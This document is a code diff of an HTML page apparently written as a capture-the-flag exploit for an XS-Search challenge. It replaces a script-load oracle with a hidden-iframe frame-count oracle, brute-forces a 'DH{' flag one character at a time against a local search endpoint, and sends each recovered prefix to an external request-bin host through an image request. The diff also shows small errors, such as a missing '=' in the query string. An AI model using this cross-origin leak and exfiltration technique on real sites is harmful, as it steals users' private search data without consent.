@@ -9,34 +9,32 @@
     <h1>XS-Search Site</h1>
 
         <script>
-            async function req(url) {
-                return await new Promise((resolve, reject) => {
-                    const script = document.createElement("script");
-                    script.src = url;
-                    script.onload = resolve;
-                    script.onerror = reject;
-
-                    document.head.appendChild(script);
-                });
-            }
-
             async function search(query) {
-                try {
-                    await req(
-                    `http://127.0.0.1:8000/search?query=${query}`
-                    );
-                    return true;
-                } catch (e) {
-                    return false;
-                }
+                return new Promise((resolve) => {
+                    const ifr = document.createElement('iframe');
+                    ifr.src = `http://127.0.0.1:8080/search?query${encodeURIComponent(query)}`;
+                    ifr.style.display = 'none';
+                    document.body.appendChild(ifr);
+
+                    ifr.onload = () => {
+                        const isFound = ifr.contentWindow.length > 0;
+                        document.body.removeChild(ifr);
+                        resolve(isFound);
+                    }
+
+                    setTimeout(() => {
+                        document.body.removeChild(ifr);
+                        resolve(false);
+                    }, 300);
+                })
             }
 
             async function exploit() {
-                let chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-                let secret_length = 36;
+                let chars = "abcdefghijklmnopqrstuvwxyz0123456789}"
+                let secret_length = 40;
                 let secret = "DH{";
 
-                for (let i = 3; i < secret_length; i++) {
+                for (let i = 0; i < secret_length; i++) {
                     let found = false;
 
                     for (let c of chars) {
@@ -45,6 +43,8 @@
                             new Image().src = `https://pdvsomq.request.dreamhack.games?secret=${secret}`;
                             console.log(`found: ${secret}`);
                             found = true;
+
+                            if (c === '}') return;
                             break;
                         }
                     }
